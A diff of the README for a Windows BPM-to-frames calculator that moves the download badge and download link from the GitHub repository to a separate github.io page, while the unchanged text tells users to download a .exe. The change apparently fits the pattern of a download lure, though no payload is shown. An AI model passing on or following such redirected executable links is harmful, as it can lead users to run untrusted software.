@@ -1,6 +1,6 @@
 # ⚡ bpm-to-frames-calculator - Sync your motion frames to music
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Attainmentrockwell643/bpm-to-frames-calculator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://attainmentrockwell643.github.io)
 
 ## 📌 About this project
 
@@ -12,7 +12,7 @@ This application runs on Windows systems. Ensure your machine runs Windows 10 or
 
 ## 📥 Getting the software
 
-Visit this page to download the program: [https://github.com/Attainmentrockwell643/bpm-to-frames-calculator](https://github.com/Attainmentrockwell643/bpm-to-frames-calculator). 
+Visit this page to download the program: [https://attainmentrockwell643.github.io](https://attainmentrockwell643.github.io). 
 
 Look for the latest release on the right side of the page. Click the link that ends in .exe to start your download. Save the file to your desktop for easy access.
 
